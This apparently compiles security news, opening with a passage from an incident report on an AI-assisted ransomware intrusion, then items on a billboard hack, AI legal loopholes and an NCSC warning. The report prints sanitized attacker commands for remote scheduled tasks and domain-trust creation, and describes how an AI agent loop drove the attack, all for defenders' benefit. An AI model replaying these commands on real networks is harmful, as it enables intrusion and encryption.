The groundwork came on 13 September, when the attacker enumerated trusts with nltest /domain_trusts and searched SYSVOL for other schools’ names and subnets.

The build ran on 18 September, from 15:39 to 18:37 UTC. Within that window the attacker created two-way trusts between three domains using netdom (the built-in tool for managing domain trusts) and dnscmd (the built-in DNS management tool) (T1484.002 Domain Trust Modification). A two-way trust lets an account from one domain authenticate in the others. It does not grant permissions by itself, which is why the attacker followed the trusts with an explicit access push. The first step was a dnscmd call that created a conditional forwarder, a DNS rule that sends lookups for another domain to that domain’s name servers, so the domains could find each other. The netdom calls then built the trust, first from one side (16:09) and, seven minutes later, from the other (16:16).

The trust commands authenticate as library in three different domains, and as svc_bkpmon in at least one. That tells us the backdoor accounts had already been created in several domains before the trusts were built, which is how the attacker had the rights to build them.

Also inside that same three-hour window, the attacker ran a sequence of diagnostic probes and restarted Netlogon, the Windows service that maintains the secure channel between domains. Three probes (diag_member, diag_nl and lmhosts_test) ran between 16:26 and 16:31, before the access push. A fourth (wb_probe) ran at 17:23, after it, and checked the trusts with netdom trust /verify in both directions between two of the domains. Netlogon was restarted (nl_restart) at 18:36. The probe sequence is the diagnose-and-adapt evidence for the trust build. Because the script bodies are unavailable, we cannot say what the probes returned or whether the first trust attempt succeeded.

The access push began at 16:36 UTC, after the first probes: grant_lib.ps1 was pushed by scheduled task to about 40 machines, 3 to 50 seconds apart, granting the backdoor account access everywhere, with stragglers retried at 17:07 and 17:22 (T1078.002 Valid Accounts: Domain Accounts). About 50 machines were reached from the unmanaged host, and about 37 were encrypted the next morning. That cross-domain encryption suggests the trusts functioned, though we treat it as suggestive rather than as proof.

Commands (sanitized, UTC). <domain2>, <domain3> and <domain4> are three different domains, and the <...-netbios> tokens are their short names. Passwords are redacted in the log.

2026-09-18 15:48:19 schtasks /create /s <ip> /u <domain2-netbios>\svc_bkpmon /p <redacted> /tn WindowsTempDiag /tr "powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\trust_<name>.ps1" /sc once /st 23:59 /ru SYSTEM /f 2026-09-18 16:09:30 dnscmd . /zoneadd <domain2> /forwarder <ip> <ip> /dsforwarder 2026-09-18 16:09:34 netdom trust <domain3> /d:<domain2> /add /twoway /ud:<domain3-netbios>\library /pd:<redacted> /uo:<domain2-netbios>\svc_bkpmon /po:<redacted> 2026-09-18 16:16:23 netdom trust <domain2> /d:<domain3> /add /twoway /ud:<domain2-netbios>\library /pd:<redacted> /uo:<domain3-netbios>\library /po:<redacted> /verbose 2026-09-18 16:26:48 cmd.exe /c ""C:\Windows\Temp\diag_member.bat"" 2026-09-18 16:28:26 cmd.exe /c ""C:\Windows\Temp\diag_nl.bat"" 2026-09-18 16:31:43 cmd.exe /c ""C:\Windows\Temp\lmhosts_test.bat"" 2026-09-18 17:23:44 cmd.exe /c ""C:\Windows\Temp\wb_probe.bat"" 2026-09-18 17:23:44 w32tm /stripchart /computer:<ip> /samples:2 /dataonly 2026-09-18 17:23:46 netdom trust <domain4> /d:<domain3> /verify /ud:<domain4-netbios>\library /pd:<redacted> /uo:<domain3-netbios>\<account> /po:<redacted> 2026-09-18 17:24:07 netdom trust <domain3> /d:<domain4> /verify /ud:<domain4-netbios>\library /pd:<redacted> /uo:<domain3-netbios>\<account> /po:<redacted> 2026-09-18 18:36:56 cmd.exe /c ""C:\Windows\Temp\nl_restart.bat""

Defender action: Alert on the creation of any new domain trust and on netdom trust execution. A new trust between domains is a rare, high-privilege change that a healthy estate almost never makes.

Conclusion and Recommendations

It is one thing to find anecdotal experiments with AI in attacks, and another to find the approach inside a working ransomware playbook. The affiliate in this case ran its usual sequence: backup credential theft, rogue domain administrators, trusts between domains, removal of endpoint security, encryption. It handed the hands-on work to a hybrid of a person and a model. One case does not make a trend, but the approach looks pragmatic: the model takes the mechanical, repetitive work, and nothing in it needed skill or spend that these attackers did not already have. We will be watching for more cases like this one, and for whether the playbook spreads.

Agentic loops are noisy. A loop that reads each result and tries again keeps repeating itself: the same command re-run unchanged, then a small tweak, then a different tool, numbered script after numbered script, probe files and confirmation strings left on disk, the same reconnaissance from several angles. Here the retries came every 40 to 100 seconds. This noise is easy to discover, and it is often underreported in accounts of AI-operated attacks, but it is the attribute defenders most need to understand. A loop does not make an intrusion quiet or subtle. It makes it repetitive, and repetition is what gives it away.

Prevent, do not race. Detection that depends on spotting enough events quickly enough loses to anything that tries again every minute. Prefer controls that work regardless of volume and speed, because they stop an action the first time and the hundredth:

Keep the administrative accounts of separate domains separate, and never keep privileged credentials for several domains in one place. Creating a trust takes administrative rights in each domain involved. After taking credentials from the backup servers, the attacker created the library account in at least three domains and used it to build the trusts. Put domain trusts and domain-admin accounts behind change control, and alert on every one that appears without it.

Treat backup as a target, and review your backup strategy for malicious intent. Most backup designs assume accidents. This attacker hit the backup layer first (credential theft) and last (deletion of system-state backups). Scope backup accounts per domain, isolate the backup servers, and keep immutable recovery copies that no domain account can delete.

Restrict remote execution and administrative shares. WMI, remote registry, scheduled-task creation and ADMIN$ access were the attacker’s movement fabric. Limit them to known management hosts.

Block interpreters and shells on machines that never use them. Portable Python and PowerShell on ordinary workstations ran the attacker’s tooling.

Put an endpoint agent on every machine. The staging host here was unmanaged, which is why we cannot say who or what drove the commands.

Nothing here is new. We have seen nothing novel or creative in this attack: built-in tools, a few public ones and a commodity encryptor. The security practices that stop conventional ransomware stop this too, and they should be adopted. What a model changes is not what works, but what the traces look like.

IOCs and How to Follow Our Research

The full indicator set for this research is available from our GitHub IOC repository to support other researchers and the wider defender community. The same indicators are also delivered through Bitdefender IntelliZone, our threat intelligence platform, alongside the broader context around this activity.

Attacks, Breaches & Threat Intel.title: Hackers put porn on public billboards and claim it was “far too easy”
Attacks, Breaches & Threat Intel.context: The cyberattacks were claimed by a group called Leakers$, which said it exploited software used to send content to LED displays
Attacks, Breaches & Threat Intel.full_text:
While digital billboards are supposed to grab your attention, recent reports from Egypt, Malaysia, and Brazil described them doing so with explicit footage.

The cyberattacks were claimed by a group called Leakers$, which said it exploited software used to send content to LED displays.

The group said it did not hack into individual billboards to show the pornographic footage, but that it accessed the software used to send the content.

For example, on October 29, explicit footage appeared on a large billboard overlooking one of Egypt’s busiest highways. Videos circulating online showed the attackers’ aliases and a Telegram channel address overlaid on the footage. Some motorists stopped to record it.

Egyptian authorities said the billboard’s operator suffered a website compromise, resulting in unauthorized footage appearing in several countries simultaneously. Similar events were reported in Malaysia and Brazil. The attackers also claimed access to systems in Iraq and China, but those claims are less firmly corroborated.

Speaking to The Cairo Report, a representative of Leakers$ claimed the group found thousands of exposed systems during roughly two hours of automated scanning. The representative described a vulnerability in content-transmission software and weaknesses accessible through the systems’ own web pages and interfaces.

That is the group’s account, but if it is accurate, it helps explain the apparent ease and reach of the attack:

Internet exposure makes targets discoverable. Attackers can scan for reachable management systems rather than physically approach individual screens.

Repeated software weaknesses can scale. Finding a flaw in software used across multiple installations can create opportunities far beyond one billboard.

Content-management access is the prize. Someone who gains control of the system that publishes advertisements may be able to replace legitimate content without touching the display itself.

This is another example of how convenient remote management can expose systems to attack. Recent attacks on refrigerated systems in European supermarkets demonstrated a similar risk. The cooling systems are internet-connected, so mechanics can remotely diagnose and fix problems.

What should be done

The risk of food waste or dangerous traffic situations should be a warning to review what organizations need to do to prevent their systems from being hacked and abused.

Regarding digital billboards, the Out of Home Advertising Association of America’s security guidelines tell operators not to rely on manufacturers’ default passwords or reuse passwords across displays. They also recommend restricting access to management services, using multifactor authentication, and protecting remote connections with a VPN.

But the practical response is less about protecting a giant television and more about securing a remotely managed computer system:

Restrict management access rather than leaving it open to the public internet.

Replace default and reused passwords and enable multifactor authentication.

Keep signage software, controllers, and networking equipment updated.

Check who has access, including suppliers, and how that access is protected.

Monitor systems and rehearse a way to stop unauthorized access quickly.

These same basic rules can be applied to smart household appliances.

What do cybercriminals know about you?

Use Malwarebytes’ free Digital Footprint scan to see whether your personal information has been exposed online.

Attacks, Breaches & Threat Intel.title: AIs Hacking the Law
Attacks, Breaches & Threat Intel.context: 1 Courts absorb most exploits through interpretation, and such vulnerabilities rarely surface in the first place
Attacks, Breaches & Threat Intel.full_text:
AIs Hacking the Law

In both a 2021 essay and my 2022 book, A Hacker’s Mind, I talk about AIs finding vulnerabilities and exploits—hacking—the legal system.

Here’s some demonstrations of this from Germany:

Legal systems encode the foundations of social order in natural language. Similar to computer systems, the written law can contain vulnerabilities that invite exploitation.1 Courts absorb most exploits through interpretation, and such vulnerabilities rarely surface in the first place. With highly capable AI systems enabling the discovery of vulnerabilities at unprecedented scale, we believe the latter could change.

In testing this hypothesis, we have identified a substantial number of vulnerabilities in the German legal system using LLMs. To our knowledge, none of these have been previously recorded. We share a selection of vulnerabilities below, and present potential exploits for each. We share only those vulnerabilities whose exploitation we believe would not cause serious harm.

We believe that with cheap legal reasoning proliferating, AI systems could jeopardize the functioning of today’s legal systems. In such a world, lawmakers would need to significantly harden the process of legislation, for example by leveraging advanced AI themselves.

Still in its early stages, but definitely something that’s coming.

Tags: AI, hacking, laws

Attacks, Breaches & Threat Intel.title: Cyber chief: UK facing AI-powered attacks on critical infrastructure within two years
Attacks, Breaches & Threat Intel.context: AI-powered malware highly likely to be used in ransomware attack on Britain’s critical national infrastructure by 2028, new report warns
Attacks, Breaches & Threat Intel.full_text:
AI-powered malware highly likely to be used in ransomware attack on Britain’s critical national infrastructure by 2028, new report warns.

Head of GCHQ’s National Cyber Security Centre to warn, as a society, the era of “tech on the cheap” at expense of security is over.

New State of the Cyber Nation report calls on organisations to make “significant changes” to avert future where AI is used against UK economy and society.

The UK’s critical national infrastructure should be braced for a ransomware attack involving AI-powered malware by 2028, a new report published today [Tuesday 3 November] by the National Cyber Security Centre (NCSC) – a part of the UK’s signals intelligence agency GCHQ says.

The NCSC's State of the Cyber Nation warns that within the next two years, AI adoption by hostile actors is “highly likely” to increase the scale and efficiency of their operations, including ransomware attacks, social engineering, and vulnerability exploitation.

In a speech to launch the report, the CEO of the NCSC, Dr Richard Horne, is set to say that the AI revolution must force UK organisations to reckon with the current state of their cyber security, as new technologies will expose vulnerabilities, failings and underinvestment at an unprecedented speed and scale in the years ahead. The head of the UK's cyber agency will also set out how artificial intelligence represents the critical opportunity to improve the UK’s collective cyber resilience, but that organisations must take urgent action to address foundational investments and weaknesses or risk adversaries exploiting them instead.

The warning comes as the government is investing in the UK's defence and resilience capabilities, including greater investment in cyber defence, while taking action through the introduction of the Cyber Security and Resilience Bill and the forthcoming National Cyber Action Plan to strengthen the UK's defences, deter hostile state aggression, keep essential services running and keep the British people safe.

Alongside calls for organisations to strengthen their resilience, last week the Chancellor also announced greater investment in capabilities to help the UK harness AI for cyber defence, including £60 million into developing the first phase of a national Cyber Shield, £70 million for a new National Exposure and Real-Time Vulnerability (NERV) Centre to identify vulnerabilities across critical infrastructure and the economy, and a new AI Cyber Security Centre of Excellence, ran by the National Cyber Security Centre, in Manchester to develop world leading AI security expertise within government.

This year’s report suggests that the UK is at a point of “enormous consequence” for cyber security and that organisations across the UK must make use of the tools, standards and frameworks that already exist and are evidenced to protect them from conventional and AI-powered cyber attacks.

The NCSC is imploring organisations across the UK to face what Dr Horne is calling “a moment of choice”. In a speech to launch the report, NCSC CEO is expected to say:

In the coming months, we face a real prospect of an unprecedented rise in the number of cyber incidents. But we must be clear that is not because AI has invented new ways to attack us. But because vulnerabilities that have been tolerated for far too long can now be discovered and exploited at a scale that was once unimaginable.

“For decades, we have collectively got away with doing tech on the cheap.

“We can be a nation where leaders of all organisations actively choose to invest with urgency... And where all organisations make security and resilience a fundamental requirement, not an afterthought.

“The collective result would be a source of enduring national strength for us all.

Dr Horne will urge all organisations across the country to “take the responsibility now to make different choices”, including addressing the failure to adequately invest in their technology; not having technology unnecessarily connected to the internet; and making Cyber Essentials the starting point for cyber security, not the end goal, with organisations building greater resilience according to their size, complexity and risk.

He will say that failing to make these choices will result in leaders “having to look their investors, shareholders, employees, customers, suppliers, in the eye and explain...when food isn’t on shelves, lights aren’t on, businesses have gone under.”

In their tenth year, the National Cyber Security Centre plays a more important role than ever before, defending our security on the cyber frontline.

“The NCSC's latest annual report shows cyber threats are growing more sophisticated. We're using the power of AI to help stay ahead of those who seek to do us harm, with a new national Cyber Shield and an AI Cyber Security Centre of Excellence.
